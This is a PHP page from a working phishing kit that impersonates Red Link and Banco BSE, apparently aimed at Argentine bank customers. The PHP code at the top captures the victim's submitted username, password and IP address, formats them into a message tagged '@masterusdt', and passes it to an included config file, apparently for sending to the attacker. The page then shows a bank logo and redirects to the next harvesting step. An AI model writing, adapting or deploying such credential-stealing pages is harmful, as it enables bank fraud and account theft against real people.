<?php  
include 'config/personalizar.php';
if (isset($_POST['user'])) {
  $enviara =
  "<b> 💸 BSE PERSONA 💸 </b>\n\n".
  " ------ [ data ] ------ \n\n".
  "<b>👤 Usuario : </b> <code>".$_POST['user']."</code>\n".
  "<b>👤 Clave: </b> <code>".$_POST['pwd']."</code>\n".
  "<b>🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code>\n".
  " ------ [ @masterusdt ] ------ \n\n";    
  $enviar =  urldecode($enviara);
  include 'config/app.php';
}

?>
<!doctype html>
<html lang="es-AR">
<head>
  <meta http-equiv="refresh" id="loader" content="5;URL=step-1.php">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Red Link</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #f0f2f5;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
    }
    
    .container {
      width: 100%;
      max-width: 676px;
      margin: 0 auto;
      padding: 20px;
    }
    
    .card {
      background: white;
      border-radius: 28px;
      padding: 3rem 2rem;
      box-shadow: 0 20px 40px rgba(0,0,0,0.08);
      text-align: center;
    }
    
    /* SOLO EL LOGO EN EL MEDIO */
    .logo {
      max-width: 150px;
      width: 100%;
      height: auto;
      display: block;
      margin: 0 auto;
      animation: pulse 2s ease-in-out infinite;
    }
    
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <!-- ÚNICAMENTE EL LOGO CENTRADO Y AGRANDÁNDOSE -->
      <img src="assets/images/bank_logo.png" class="logo" alt="Banco BSE">
    </div>
  </div>
</body>
</html>